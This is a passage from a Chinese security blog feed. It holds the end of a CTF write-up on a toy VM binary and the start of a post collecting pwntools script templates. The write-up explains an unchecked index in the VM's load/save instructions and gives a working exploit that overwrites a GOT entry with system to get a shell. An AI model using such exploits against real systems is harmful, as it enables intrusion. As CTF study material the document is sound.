class="token operator">*</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> s <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8LL</span> <span class="token operator">*</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 段信息包含，段指针，大小，和numb</span>    ptr<span class="token operator">-></span>section_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>s<span class="token punctuation">;</span>    ptr<span class="token operator">-></span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>    ptr<span class="token operator">-></span>numb <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> ptr<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="指令处理"><a href="#指令处理" class="headerlink" title="指令处理"></a>指令处理</h3><p>把从输入获取到的指令存入相应的段</p><p>实现了把输入的字符串转化为对应的汇编指令。</p><p>按照<code>\n\r\t</code>把输入数据分割成一个一个指令,然后把指令字符串转化为对应汇编字节码存到数组里,然后存入text段,存进去的顺序是先进来的在高地址处</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">StoreOpcode</span><span class="token punctuation">(</span>section_info <span class="token operator">*</span>text<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> idx<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-18h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-14h]</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-10h]</span>  _QWORD <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> text <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> text<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                                    <span class="token comment" spellcheck="true">// idx为size的时候结束</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> s1 <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> delim<span class="token punctuation">)</span><span class="token punctuation">;</span> idx <span class="token operator">&lt;</span> text<span class="token operator">-></span>size <span class="token operator">&amp;&amp;</span> s1<span class="token punctuation">;</span> s1 <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> delim<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// delim分隔符为\n\r\t</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"push"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> PUSH<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"pop"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> POP<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> ADD<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"sub"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> SUB<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"mul"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> MUL<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"div"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> DIV<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"load"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> LOAD<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"save"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> SAVE<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">255LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token operator">++</span>idx<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">StoreInSection</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 最先输入的指令保存在最后面</span>      <span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="解析栈数据"><a href="#解析栈数据" class="headerlink" title="解析栈数据"></a>解析栈数据</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">StroeStack</span><span class="token punctuation">(</span>section_info <span class="token operator">*</span>stack_addr<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> idx<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-28h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-24h]</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>nptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-20h]</span>  _QWORD <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-18h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> stack_addr <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> stack_addr<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> nptr <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> delim<span class="token punctuation">)</span><span class="token punctuation">;</span> idx <span class="token operator">&lt;</span> stack_addr<span class="token operator">-></span>size <span class="token operator">&amp;&amp;</span> nptr<span class="token punctuation">;</span> nptr <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> delim<span class="token punctuation">)</span> <span class="token punctuation">)</span>      ptr<span class="token punctuation">[</span>idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">atol</span><span class="token punctuation">(</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">// 输入字符串转化为int存放到列表</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">StoreInSection</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">,</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 跟text一样，先输入的存放在高地址处</span>      <span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="run函数"><a href="#run函数" class="headerlink" title="run函数"></a>run函数</h3><p>包含了对汇编指令的实现,对上面字节码的处理是先进先出</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605071845841.png" alt="run函数"></p><ul><li>do_PUSH函数从栈的尾部读出来数据然后放入data段的尾部</li><li>do_POP函数从data段的尾部读出数据放入stack段尾部</li><li>do_ADD从data尾部读出数据a1,a2相加结果放到data尾部</li><li>do_SUB从data尾部顺序读出a1,a2  a1-a2结果放到data尾部</li><li>do_LOAD       data.append(data[num+data[-1]])   从最后一位取出来索引,然后把找到的数据放回最后一位</li><li>do_SAVE   data[data[-1]+num]=data[-2] 从data尾部取出索引,倒数第二个取出数据</li></ul><p>在 do_LOAD和do_SAVE 没有对索引的检查导致溢出</p><h3 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h3><pre class=" language-python"><code class="language-python">push push save push load push add push savedata_addr<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">13</span> <span class="token punctuation">,</span>one <span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">13</span></code></pre><p>执行完2次push之后</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605095564126.png" alt="数据的存放"></p><p>此时的内存结构为</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605094684307.png" alt="data结构"></p><ul><li>data_ptr地址为0x17c38f0,其中0xffffffff为-1表示numb</li><li>0x17c3910为data_section_ptr</li></ul><p>此时执行save会取出来-3作为索引,data_addr作为数据,即实际作用为data_section_ptr[-1-3]=data_addr</p><p>接下来的push会向data_addr指向的内容写入-13</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605100867616.png" alt="整个流程图"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>整个过程从传统的输出到显示器对显示器进行操作变成了输出到内存,对内存进行操作,泄露到显示器也变成了泄漏到内存。只要内存中两处数据存在加法或减法运算就能直接用内存计算得出来真实地址。</p><p>关注漏洞：索引越界，每次向内存中存取数据都要有对索引的检查</p><p>段信息的结构体</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605105955667.png" alt="段的信息结构体"></p><p>需要修改section_ptr指针,save到指定地址处写数据,相对于section_ptr指针的偏移是固定的,可以修改它用save修改它</p><p>需要得到libc的基地址,可以用load加载got表项,用add计算出来system函数实际的地址</p><p>用save把system函数的地址覆盖puts函数的got表项</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>file_path <span class="token operator">=</span> <span class="token string">"./pwn"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x121c)")</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f3d5</span><span class="token punctuation">,</span><span class="token number">0x4f432</span><span class="token punctuation">,</span><span class="token number">0x10a41c</span><span class="token punctuation">]</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.169'</span><span class="token punctuation">,</span> <span class="token number">57404</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    debug_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            text_base<span class="token operator">=</span><span class="token number">0</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your program name:\n"</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>debug_1<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x000000000401D55</span><span class="token punctuation">]</span><span class="token punctuation">)</span>inst<span class="token operator">=</span><span class="token string">"push push save push load push add push save"</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our instruction:\n"</span><span class="token punctuation">,</span>inst<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#-5得到malloc函数的got</span>one_offset<span class="token operator">=</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"malloc"</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>stack<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x000000000404088</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span>one_offset<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">]</span>payload<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> stack<span class="token punctuation">:</span>    payload<span class="token operator">+=</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"stack data:\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> vmpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf脚本技巧</title>
      <link href="2020/11/10/pwn%E5%B8%B8%E7%94%A8%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7%E6%A8%A1%E6%9D%BF/"/>
      <url>2020/11/10/pwn%E5%B8%B8%E7%94%A8%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h3 id="脚本的开始"><a href="#脚本的开始" class="headerlink" title="脚本的开始"></a>脚本的开始</h3><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605108280066.png" alt="大纲图"></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>file_path <span class="token operator">=</span> <span class="token string">"./RHVM.bin"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x121c)")</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.169'</span><span class="token punctuation">,</span> <span class="token number">57404</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span></code></pre><h2 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h2><h3 id="用来调试开启PIE的程序"><a href="#用来调试开启PIE的程序" class="headerlink" title="用来调试开启PIE的程序"></a>用来调试开启PIE的程序</h3><p>能得到pie的地址运行一些gdb命令</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    debug_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            text_base<span class="token operator">=</span><span class="token number">0</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>debug_1<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x000000000000117C</span><span class="token punctuation">,</span><span class="token number">0x00000000000011B8</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="字节转化"><a href="#字节转化" class="headerlink" title="字节转化"></a>字节转化</h2><h3 id="比特流转int-（0a-21-54–-gt-”0x54210a”）"><a href="#比特流转int-（0a-21-54–-gt-”0x54210a”）" class="headerlink" title="比特流转int （0a 21 54–&gt;”0x54210a”）"></a>比特流转int （0a 21 54–&gt;”0x54210a”）</h3><pre class=" language-python"><code class="language-python">p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#比特流转int</span>result<span class="token operator">=</span>u64<span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak bit to int : "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>result</code></pre><h3 id="字符串转int（”0x5060a0”–-gt-0x5060a0）"><a href="#字符串转int（”0x5060a0”–-gt-0x5060a0）" class="headerlink" title="字符串转int（”0x5060a0”–&gt;0x5060a0）"></a>字符串转int（”0x5060a0”–&gt;0x5060a0）</h3><pre class=" language-python"><code class="language-python">p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#12是64位libc地址的长度  16是64位canary的长度 (不算0x)</span>result<span class="token operator">=</span>int<span class="token punctuation">(</span>info<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak str to int : "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="移位"><a href="#移位" class="headerlink" title="移位"></a>移位</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#从fro到to进行移位操作,索引从0开始</span><span class="token keyword">def</span> <span class="token function">left</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>item<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffffffffffffff</span><span class="token keyword">def</span> <span class="token function">yiwei</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span>fro<span class="token punctuation">,</span>to<span class="token punctuation">,</span>bit<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> bit<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>        fro_bit<span class="token operator">=</span><span class="token punctuation">(</span>content<span class="token operator">>></span><span class="token punctuation">(</span>fro<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span> <span class="token comment" spellcheck="true">#取出来第fro位</span>        fro_bit_8<span class="token operator">=</span>fro_bit<span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#把fro位复制到其他位</span>        result<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0xff</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>to <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 